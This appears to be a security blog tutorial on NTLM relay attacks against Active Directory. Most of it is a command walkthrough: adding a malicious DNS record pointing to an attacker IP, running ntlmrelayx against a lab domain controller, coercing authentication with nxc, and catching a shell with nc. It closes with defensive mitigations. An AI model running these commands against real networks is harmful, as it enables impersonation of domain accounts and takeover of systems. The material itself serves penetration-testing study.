---
title: "NTLM Relay"
date: 2025-11-11 00:00:00 +0800
categories: [AD- Attacks]
tags: [NTLM Relay]
platform: AD- Attacks
author: 0xmr
image: /assets/img/posts/relay.jpg
excerpt: "Technical understanding and practical overview"
---

# NTLM Relay

> **NTLM Relay** is a man-in-the-middle (MITM) attack against the NTLM authentication protocol. When an NTLM authentication occurs between two machines (a client and a server), an attacker can:
>
> 1. Intercept or coerce an authentication attempt.
> 2. Relay that authentication request to another server.
> 3. Authenticate to the target server as the victim — **without knowing the victim's password**.
>
> In short, NTLM Relay abuses NTLM’s lack of mutual authentication and the absence (or misconfiguration) of message signing.

## First Method

### ⚙️ Setting Up a Malicious DNS Record (using dnstool.py)
```bash
python3 dnstool.py -u '$domain\$user' -p '$pass' <Full-DC-Name> -a add -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -d '$attacker_ip' -dns-ip $target_ip --tcp
```

**What this does:** Creates a DNS record that points a controlled hostname to the attacker machine, causing victims to connect to the attacker's IP when resolving that name.

### 🧾 Verify the DNS Entry
```bash
dig localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.$domain @<Full-DC-Name> +tcp +short
```

### 🧨 Start the NTLM Relay Server
The relay server listens for incoming NTLM authentications and relays them to the target service. Example targets include WinRM, SMB, LDAP, LDAPS, etc.

```bash
# replace $Protocol with winrm, smb, ldap, etc.
ntlmrelayx.py -smb2support -t '$Protocol://dc01.nanocorp.htb'
```

### 🧨 Coerce a Victim Machine to Authenticate to You
Use coercion modules to force a system (for example, a domain controller or other host) to authenticate to the malicious hostname you created.
```bash
nxc smb $ip -u $user -p '$pass' -M coerce_plus -o LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA ALWAYS=true
```

### 🔓 Catch the Shell (if configured to spawn one)
```bash
nc localhost 11000
```

## Second Method
> Coming soon...

---

**Notes & Recommendations**
- Replace variables (like `$domain`, `$user`, `$pass`, `$attacker_ip`, and `$target_ip`) with real values relevant to your environment.
- Exercise caution: performing these techniques without authorization is illegal and unethical. Use only on systems you own or where you have explicit permission to test.
- For defense, consider: enabling SMB signing and LDAP channel binding, disabling or restricting NTLM, applying Microsoft’s recommended mitigations, and monitoring for suspicious coercion activity.
